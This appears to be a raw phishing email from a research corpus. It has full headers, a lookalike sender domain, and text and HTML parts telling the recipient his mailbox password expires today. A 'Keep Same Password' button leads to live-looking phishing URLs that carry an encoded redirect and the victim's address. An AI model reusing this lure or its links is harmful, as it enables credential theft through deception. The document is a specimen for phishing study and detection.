@@ -1,0 +1,197 @@
+Return-Path: admin@bakerhuighes.com
+Delivered-To: jose@monkey.org
+X-FDA: 82098354492.21.3C9F39D
+Received: from bakerhuighes.com (bakerhuighes.com [151.236.17.176])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP id 85391140008
+	for <jose@monkey.org>; Thu,  9 May 2024 09:37:24 +0000 (UTC)
+Authentication-Results: imf17.b.hostedemail.com;	dkim=pass
+ header.d=bakerhuighes.com header.s=202404 header.b="iUAh4/7L";	spf=pass
+ (imf17.b.hostedemail.com: domain of admin@bakerhuighes.com designates
+ 151.236.17.176 as permitted sender) smtp.mailfrom=admin@bakerhuighes.com;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1715247444; a=rsa-sha256;
+	cv=none;
+	b=MxFk0V6yl840ebFuu5eqljj3MRRsWVP64UJ5posddqb12ow3PQCkZa9vzATv3rBeU5lAsu
+	Z48azjMLg2n/JFUSX0E6skKarpzfPezWSv7N4UUnSgRpQzsch7G+Nxzn5AjcQYGII7tjBH
+	osFoZWXrM7g98A1vID0klMcbojoDiJo=
+ARC-Authentication-Results: i=1;	imf17.b.hostedemail.com;	dkim=pass
+ header.d=bakerhuighes.com header.s=202404 header.b="iUAh4/7L";	spf=pass
+ (imf17.b.hostedemail.com: domain of admin@bakerhuighes.com designates
+ 151.236.17.176 as permitted sender) smtp.mailfrom=admin@bakerhuighes.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1715247444;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=4zQMyhEQaiGDjJh+TtSRCCH+67efAE87g55v2OZCekg=;
+	b=sCeCIuIVIZNwbAyhr9VtOFLQgiPD+HM5Q7mshZK/je23aqfNlnM2eX4+WqoTm+ZMYxcH37
+	IJT17nLqocqD07heJkPCaIfzWFC13tRJHxnBqSwSafDB7hQk3e/WIWqHzuxE1G1zjBatAk
+	mgQLlWI+9aj3HCmR288PuqGjaWCUhVw=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=bakerhuighes.com;
+	s=202404; t=1715247115;
+	bh=4zQMyhEQaiGDjJh+TtSRCCH+67efAE87g55v2OZCekg=;
+	h=From:Subject:To:Date:From;
+	b=iUAh4/7LG9o0WwmfEBTiq31bfT7TmpUSG3v+OEJ4QaLbB3nSiIgo7iYReLWb7wWOB
+	 omV9NRxlxdkrr1yVCrhEcohS3L4iDHaqmF9zpdYXBeNMI9xRQHBgmuYwZyQRyo5eM0
+	 yrODcVgPSX82XVNUR2H7wC/vzCmUb9BxkBIyJaL+34fmkdW/7FlnjqhrxCdazsCyr/
+	 EDgQjtKlGlgmt17TzUN8TIvjhw21PrC0VAAm+axtDs6WYmX6QwFeZGb1KjPy5iy7tr
+	 L8d55S6LNr//qiu2rV9QXEq/JQvPGCbmVpPULYp52/BtK18Xfcum+ZqKz6ROP8PG4G
+	 0I1FtVRnGyLUA==
+Received: from WIN-LIVFRVQFMKO (unknown [212.113.107.180])
+	by bakerhuighes.com (Postfix) with ESMTPSA id F0D188F915
+	for <jose@monkey.org>; Thu,  9 May 2024 09:31:54 +0000 (UTC)
+From: "MONKEY | Notification" <admin@bakerhuighes.com>
+Subject: About: Mail Account update Thursday, May 9, 2024 - 6597
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="a0oZZRQUUhKE9XbOCp3v7gbQ3WP=_hTG8K"
+MIME-Version: 1.0
+Date: Thu, 9 May 2024 02:31:55 -0700
+Message-Id: <202409050231547CCF7528DA-E0BED3FE25@bakerhuighes.com>
+X-Spam-Status: No, score=3.78
+X-Stat-Signature: xwmf1r9g3hd6iigsrfe45wwb5fisu9mw
+X-Rspamd-Queue-Id: 85391140008
+X-Rspamd-Server: rspam08
+X-Rspam-User: 
+X-HE-Tag: 1715247444-105353
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18rjgOSYRcG3zCVks7FXoPVsX6eoHEop/rW/v6ROIXS30/?=
+ =?utf-8?q?ysNHhUzWfbsTsYx3dpU/xLKUUd8a8VGWZ44yXyxUf9qJTjQ/V2M+mOP/kigZ7XU05?=
+ =?utf-8?q?SbIh2jbQ40cgofv01jFQYW4DHvNm/i0RFkQLcuYyFaYDEEFKI6qbhwikEr8+4Ts7N?=
+ =?utf-8?q?h5MJHV9OYxX2YMJPxa8dyCAv3JiZvDwh+Ozv4g2rv8ofT/NjMJfV74qAZT6AVZG5b?=
+ =?utf-8?q?epcqdsyYk6qWRD76YSp3nCpLZcN69dBjPSw6sRY728vZRP/XSrAXPewycJQnqAbWk?=
+ =?utf-8?q?FOBL/t70+thcuwgJYlQUZrfs1dNLm3lgP8HOnKbJ8ObM3NBNTUH4w+Upo85SlOLRq?=
+ =?utf-8?q?oD0s?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 131
+
+This is a multi-part message in MIME format
+
+--a0oZZRQUUhKE9XbOCp3v7gbQ3WP=_hTG8K
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Greetings
+jose,
+
+=A0The last day to update your password for the
+(jose@monkey.org)
+service is today.
+
+=A0To retain your existing password, click on this box. The
+password will expire on the Thursday, May 9, 2024 .=A0=A0
+
+=A0
+
+Keep
+ Same Password http://ceh8.i8wdz3.akaphibetaomega.org/#aHR0cHM6Ly9jbG9=
+1ZGZsYXJlLWlwZnMuY29tL2lwZnMvYmFmeWJlaWJ1bzdiZ2VwNHRlcGk2bGw0emw2YmVxc=
+3RpeGV6eGY3dDRiMzNwZWhrM281c3N5bHcydmEvPzAyOjMxIEFNOSYjam9zZUBtb25rZXk=
+ub3Jn
+
+Administrator for MONKEY
+Account and services.
+=A9 2024
+
+--a0oZZRQUUhKE9XbOCp3v7gbQ3WP=_hTG8K
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+ <BASE href=3D"http://kf36.yzqulb.akaphibetaomega.org/"><title>About: =
+Mail Account update Thursday, May 9, 2024 - 6597</title>
+</head>
+ <body> <P style=3D"TEXT-ALIGN: center"><SPAN style=3D"FONT-SIZE: smal=
+l; FONT-FAMILY: 'Times New Roman'; WHITE-SPACE: normal; WORD-SPACING: =
+0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0=
+,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; =
+DISPLAY: inline !important; TEXT-INDENT: 0px; font-variant-ligatures: =
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial; text-decoration-style: initial; text-=
+decoration-color: initial">Greetings jose, </SPAN></p><p style=3D"TEXT=
+-ALIGN: center"><SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: 'Times N=
+ew Roman'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: non=
+e; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: norma=
+l; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !importa=
+nt; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-cap=
+s: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
+initial; text-decoration-style: initial; text-decoration-color: initia=
+l"><FONT color=3D#252525><SPAN style=3D"FONT-SIZE: small; FONT-FAMILY:=
+ 'Times New Roman'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STY=
+LE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline=
+ !important; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-th=
+ickness: initial; text-decoration-style: initial; text-decoration-colo=
+r: initial"><FONT color=3D#252525>&nbsp;The last day to update your pa=
+ssword for the <STRONG>(</STRONG><STRONG><FONT color=3D#ff0000>jose@mo=
+nkey.org</FONT></STRONG><STRONG>) </STRONG>service is today.</FONT></S=
+PAN></FONT></SPAN></p><p style=3D"TEXT-ALIGN: center"><SPAN style=3D"F=
+ONT-SIZE: small; FONT-FAMILY: 'Times New Roman'; WHITE-SPACE: normal; =
+WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400=
+; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: =
+2; WIDOWS: 2; DISPLAY: inline !important; TEXT-INDENT: 0px; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial"><FONT color=3D#252525>&nbsp;T=
+o retain your existing password, click on this box. The password will =
+expire on the Thursday, May 9, 2024 </FONT></SPAN><SPAN style=3D"FONT-=
+SIZE: small; FONT-FAMILY: 'Times New Roman'; WHITE-SPACE: normal; WORD=
+-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; CO=
+LOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; W=
+IDOWS: 2; DISPLAY: inline !important; TEXT-INDENT: 0px; font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial; text-decoration-style: init=
+ial; text-decoration-color: initial"><SPAN id=3Doutput-sentence~2 styl=
+e=3D"FONT-SIZE: 16px; FONT-FAMILY: 'Open Sans', sans-serif; WHITE-SPAC=
+E: pre-wrap; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(37,37,37); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; BAC=
+KGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatu=
+res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
+; text-decoration-thickness: initial; text-decoration-style: initial; =
+text-decoration-color: initial"><SPAN id=3Doutput-word~2~7 style=3D"CU=
+RSOR: auto" data-segment-position=3D"7"><FONT face=3D"Times New Roman"=
+>.</FONT></SPAN></SPAN><SPAN style=3D"FONT-SIZE: 16px; FONT-FAMILY: 'O=
+pen Sans', sans-serif; WHITE-SPACE: pre-wrap; WORD-SPACING: 0px; TEXT-=
+TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(37,37,37); =
+FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-li=
+gatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initi=
+al; text-decoration-color: initial">&nbsp;</SPAN>&nbsp;</SPAN></p><p s=
+tyle=3D"TEXT-ALIGN: center" align=3Dcenter>&nbsp;<table style=3D"MARGI=
+N-LEFT: auto; MARGIN-RIGHT: auto" cellSpacing=3D0 cellPadding=3D0 widt=
+h=3D"100%" border=3D0><tbody style=3D"BOX-SIZING: border-box"> <TR sty=
+le=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box; PA=
+DDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT:=
+ 0px" align=3Dcenter><table style=3D"BOX-SIZING: border-box; BORDER-CO=
+LLAPSE: collapse; TEXT-ALIGN: center" cellSpacing=3D0 cellPadding=3D0 =
+border=3D0><tbody style=3D"BOX-SIZING: border-box"> <TR style=3D"BOX-S=
+IZING: border-box"> <TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16=
+px; TEXT-ALIGN: left; border-radius: 6px" bgColor=3D#0073f0 align=3Dce=
+nter><A style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; TEXT-DECORAT=
+ION: none; BORDER-TOP: #0073ff 1px solid; BORDER-RIGHT: #0073ff 1px so=
+lid; WIDTH: 216px; BORDER-BOTTOM: #0073ff 1px solid; FONT-WEIGHT: norm=
+al; COLOR: #ffffff; PADDING-BOTTOM: 12px; TEXT-ALIGN: center; PADDING-=
+TOP: 12px; PADDING-LEFT: 18px; BORDER-LEFT: #0073ff 1px solid; DISPLAY=
+: inline-block; LETTER-SPACING: 0px; LINE-HEIGHT: 27px; PADDING-RIGHT:=
+ 18px; BACKGROUND-COLOR: #0073ff; border-radius: 6px" href=3D"http://k=
+iwy.k0pvxw.akaphibetaomega.org/#aHR0cHM6Ly9jbG91ZGZsYXJlLWlwZnMuY29tL2=
+lwZnMvYmFmeWJlaWJ1bzdiZ2VwNHRlcGk2bGw0emw2YmVxc3RpeGV6eGY3dDRiMzNwZWhr=
+M281c3N5bHcydmEvPzAyOjMxIEFNOSYjam9zZUBtb25rZXkub3Jn" rel=3D"noopener =
+noreferrer" target=3D_blank data-saferedirecturl=3D"">Keep Same Passwo=
+rd</A></TD></TR></TABLE></TD></TR></TABLE></p><p style=3D"MARGIN-BOTTO=
+M: 0px; TEXT-ALIGN: center; MARGIN-TOP: 20px"><SPAN style=3D"FONT-SIZE=
+: small">Administrator for <STRONG>MONKEY</STRONG> Account and service=
+s. <BR>&copy; <STRONG>2024</STRONG></SPAN></P></body>
+</html>
+
+--a0oZZRQUUhKE9XbOCp3v7gbQ3WP=_hTG8K--
+
+
